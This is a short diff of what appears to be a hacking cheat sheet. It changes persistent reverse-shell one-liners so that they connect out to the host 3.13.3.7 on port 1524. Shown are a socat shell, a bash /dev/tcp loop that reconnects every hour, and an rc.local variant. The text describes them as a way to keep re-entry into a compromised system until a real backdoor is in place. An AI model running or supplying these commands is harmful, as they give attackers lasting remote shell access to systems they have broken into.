@@ -445,12 +445,12 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
 
 ```
-$ while :; do setsid bash -i &>/dev/tcp/127.1/1524 0>&1; sleep 3600; done &>/dev/null &
+$ while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done &>/dev/null &
 ```
 
 or add to */etc/rc.local*:
 ```
-nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/127.1/1524 0>&1; sleep 3600; done' &>/dev/null &
+nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done' &>/dev/null &
 ```
 
 or the user's *~/.profile* (also stops multiple instances from being started):
